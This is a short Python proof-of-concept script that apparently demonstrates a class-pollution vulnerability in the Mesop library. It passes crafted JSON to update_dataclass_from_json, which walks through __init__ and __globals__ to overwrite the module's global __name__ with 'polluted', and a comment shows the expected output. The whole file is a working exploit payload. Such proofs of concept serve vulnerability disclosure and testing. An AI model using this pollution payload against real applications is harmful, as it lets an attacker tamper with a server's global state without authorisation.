from mesop.dataclass_utils.dataclass_utils import update_dataclass_from_json
from dataclasses import dataclass
@dataclass
class State:
  input: str
  output: str
  textarea_key: int

obj = State('HELLO', 'WORLD', 0)

try:
    update_dataclass_from_json(obj, '{"__init__": {"__globals__": {"__name__": "polluted"}}}')
except:
    pass

print(__name__) # polluted